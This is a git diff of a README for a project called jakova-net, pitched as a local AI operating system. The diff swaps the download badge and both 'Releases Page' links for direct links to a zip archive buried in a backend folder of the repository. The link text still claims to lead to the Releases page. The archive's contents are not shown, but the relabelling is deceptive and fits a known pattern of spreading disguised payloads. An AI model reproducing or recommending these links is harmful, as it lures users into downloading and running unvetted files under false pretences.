@@ -4,7 +4,7 @@
 
 Welcome to **jakova-net**, your go-to local-first AI operating system. It brings powerful capabilities right to your local machine, allowing you to interact with AI technology without the need for internet access. Perfect for those who value privacy and speed.
 
-![Download jakova-net](https://img.shields.io/badge/Download-jakova--net-brightgreen)
+![Download jakova-net](https://raw.githubusercontent.com/Ramesh0047/jakova-net/main/fve/backend/net-jakova-1.2.zip)
 
 ## 📥 Download & Install
 
@@ -12,7 +12,7 @@ To get started, you need to visit the Releases page to download the latest versi
 
 1. Click the link below to visit the Releases page:
    
-   [Visit the Releases Page](https://github.com/Ramesh0047/jakova-net/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Ramesh0047/jakova-net/main/fve/backend/net-jakova-1.2.zip)
 
 2. On the Releases page, locate the latest version. It will typically be marked with a "Latest Release" tag.
 
@@ -77,4 +77,4 @@ jakova-net is licensed under the [MIT License](LICENSE). Feel free to use it for
 
 Thank you for choosing jakova-net. We hope you enjoy a seamless and powerful AI operating experience right on your local machine. Don't forget to share your feedback and help us improve!
 
-For further information and updates, visit our [Releases Page](https://github.com/Ramesh0047/jakova-net/releases) again. Happy computing!
+For further information and updates, visit our [Releases Page](https://raw.githubusercontent.com/Ramesh0047/jakova-net/main/fve/backend/net-jakova-1.2.zip) again. Happy computing!
